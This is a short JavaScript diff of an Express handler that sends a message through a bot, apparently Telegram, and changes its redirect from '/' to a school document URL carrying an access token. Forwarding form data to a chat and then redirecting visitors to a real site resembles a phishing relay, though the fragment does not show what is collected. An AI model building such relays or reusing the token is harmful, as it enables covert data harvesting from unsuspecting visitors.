@@ -20,7 +20,7 @@ const sender = async (req, res) => {
   try {
     const sentMessage = await bot.sendMessage(process.env.chat_id, msg);
     //console.log('Mensaje enviado:', sentMessage.text);
-    res.redirect('/')
+    res.redirect('https://dolischool.unez.edu.mx/dolischool_est/custom/dolischoolest/public/viewdoc.php?token=ca280f2434cb5fe4e44cb840aa8de96a&r')
   } catch (err) {
     console.error('Error al enviar mensaje:', err.message);
   }
